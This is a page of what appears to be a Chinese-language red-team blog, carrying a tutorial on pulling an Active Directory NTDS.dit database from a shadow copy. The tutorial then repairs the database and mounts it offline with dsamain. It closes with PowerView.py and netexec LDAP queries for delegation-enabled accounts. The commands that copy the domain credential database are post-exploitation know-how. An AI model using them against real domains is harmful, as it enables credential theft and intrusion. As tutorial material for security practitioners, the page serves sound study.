@@ -1,0 +1,286 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Page 9 | ShadowMccc&#39;s Blog</title>
+  <meta name="author" content="ShadowMccc">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="ShadowMccc&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="ShadowMccc&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">ShadowMccc&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 <div class="page-header logo">
+  <h1>ShadowMccc&#39;s Blog<span class="blink-fast">|</span></h1>
+</div>
+
+<div class="row page">
+
+	
+	<div class="col-md-9">
+	
+
+		<div class="slogan">
+
+
+		<i class="fa fa-heart blink-slow"></i>
+
+		Beneath this mask there is more than fIesh.Beneath this mask there is an idea, Mr. Creedy.And ideas are bulletproof.
+
+</div>    
+
+		<div id="top_search"></div>
+		<div class="mypage">
+		
+		<!-- title and entry -->
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2024/11/25/AD-离线分析NTDS.DIT/" >AD-离线分析NTDS.DIT</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-11-25  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p>曾经有人把这个所谓的“技术”当成宝贝，我问他是什么，他说我不告诉你😅（只是后面定位人员有用）</p>
+<h1><span id="获取ntds和日志">获取NTDS和日志</span></h1><p>通过各种方法将NTDS.dit和edb*的日志文件下载到本地，这里以vssadmin为例</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">cmd</span> /<span class="title">c</span> &quot;<span class="title">copy</span> \\?\<span class="title">GLOBALROOT</span>\<span class="title">Device</span>\<span class="title">HarddiskVolumeShadowCopy1</span>\<span class="title">Windows</span>\<span class="title">NTDS</span>\ <span class="title">C</span>:\<span class="title">NTDS</span>\&quot;</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">C</span>:\7<span class="title">z.exe</span> <span class="title">a</span> <span class="title">C</span>:\<span class="title">ntds.zip</span> <span class="title">C</span>:\<span class="title">NTDS</span>\</span></span><br></pre></td></tr></table></figure>
+
+<h1><span id="本地环境配置">本地环境配置</span></h1><p>根据目标机器的系统版本安装对应的版本的系统的虚拟机，安装完成后给该虚拟机安装AD DS角色（注意！如果使用Vmware请关闭VBS，不然在winserver2012及以上由于生成ID不同会导致无法启动ldap服务）</p>
+<p>关闭脚本的链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.microsoft.com/en-my/download/details.aspx?id=53337">https://www.microsoft.com/en-my/download/details.aspx?id=53337</a></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">ServerManagerCmd</span> -<span class="title">i</span> <span class="title">AD</span>-<span class="title">Domain</span>-<span class="title">Services</span>（<span class="title">winserver</span> 2008）</span></span><br></pre></td></tr></table></figure>
+
+<p>接着将之前获取到文件放到跟目标机器一样的目录中。比如我之前是在C:\Windows\NTDS中获取的文件，那么就需要将之前获取的文件放到虚拟机的C:\windows\ntds目录</p>
+<p><img src="/images/1.png" alt="1"></p>
+<h1><span id="修复ntds文件">修复NTDS文件</span></h1><p>尝试恢复ntds数据库</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">esentutl</span> /<span class="title">r</span> <span class="title">edb</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2.png" alt="2"></p>
+<p>检查ntds.dit的完整性</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">esentutl</span> /<span class="title">g</span> <span class="title">ntds.dit</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/3.png" alt="3"></p>
+<p>如果结果如上图所示是Intergrity check successful那么就可以直接启动ldap服务了，如果返回的是失败的话就执行下面的命令对ntds.dit进行修复</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">esentutl</span> /<span class="title">p</span> <span class="title">ntds.dit</span></span></span><br></pre></td></tr></table></figure>
+
+<h2><span id="启动ldap服务">启动ldap服务</span></h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">dsamain</span> /<span class="title">dbpath</span> <span class="title">ntds.dit</span> /<span class="title">ldapport</span> 389 /<span class="title">allownonadminaccess</span> /<span class="title">allowupgrade</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/5.png" alt="5"></p>
+<h3><span id="通过ldap服务收集数据">通过ldap服务收集数据</span></h3><p>曾经有人说很鄙视用工具的人，那工具发明出来是干什么的？就喜欢当原始人是吧？我问他那用什么分析，他说用ADExplorer😅</p>
+<h4><span id="通过powerviewpy查询">通过PowerView.py查询</span></h4><p>注释powerview.py的第87行 #self.flatName &#x3D; self.ldap_server.info.other[“ldapServiceName”][0].split(“@”)[-1].split(“.”)[0]</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ powerview ./administrator:ThisisPassw0rd@192.168.116.154 --use-ldap -p 389</span><br><span class="line">$ Get-DomainUser -Where <span class="string">&#x27;userAccountControl contains TRUSTED_FOR_DELEGATION&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/6.png" alt="6"></p>
+<h4><span id="通过netexec进行查询">通过netexec进行查询</span></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec ldap 192.168.116.154 -u administrator -p ThisisPassw0rd --query <span class="string">&quot;(&amp;(userAccountControl:1.2.840.113556.1.4.803:=524288)(objectclass=user)(objectCategory=person))&quot;</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/7.png" alt="7"></p>
+<h4><span id="还可以通过ldapdomaindumpadexplorer进行收集等等">还可以通过ldapdomaindump，ADExplorer进行收集等等。。。。</span></h4>
+	
+	</div>
+  <a type="button" href="/2024/11/25/AD-离线分析NTDS.DIT/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+
+		</div>
+
+		<!-- pagination -->
+		<div>
+  		<center>
+		<div class="pagination">
+
+   
+    
+     <a href="/page/8/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
+      
+
+        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+ 
+          <a type="button" class="btn btn-default disabled">Next<i class="fa fa-arrow-circle-o-right"></i></a>
+        
+
+  
+</div>
+
+  		</center>
+		</div>
+
+		
+		
+	</div> <!-- col-md-9 -->
+
+	
+		<div class="col-md-3">
+	<div id="sidebar">
+	
+			
+<div class="widget">
+  <h4>Recent Posts</h4>
+  <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2025/03/08/一次典型的AWS渗透/" ><i class="fa fa-file-o"></i>一次典型的AWS渗透</a>
+      </li>
+    
+      <li>
+        <a href="/2024/12/25/o365 &amp; Azure-GoldenSAML/" ><i class="fa fa-file-o"></i>o365 &amp; Azure-GoldenSAML</a>
+      </li>
+    
+      <li>
+        <a href="/2024/12/20/C2基础设施搭建/" ><i class="fa fa-file-o"></i>C2基础设施搭建</a>
+      </li>
+    
+      <li>
+        <a href="/2024/12/10/OffensiveWindows攻击平台搭建/" ><i class="fa fa-file-o"></i>OffensiveWindows攻击平台搭建</a>
+      </li>
+    
+      <li>
+        <a href="/2024/12/03/AD-NTLM Relay/" ><i class="fa fa-file-o"></i>AD-NTLM Relay</a>
+      </li>
+    
+  </ul>
+</div>
+
+		
+			
+<div class="widget">
+	<h4>Links</h4>
+	<ul class="blogroll list-unstyled">
+	
+		<li><i class="false"></i><a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" title="" target="_blank"]);">hexo-theme-bithack</a></li>
+	
+	</ul>
+</div>
+
+
+		
+	</div> <!-- sidebar -->
+</div> <!-- col-md-3 -->
+
+	
+	
+</div> <!-- row-fluid -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 ShadowMccc's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
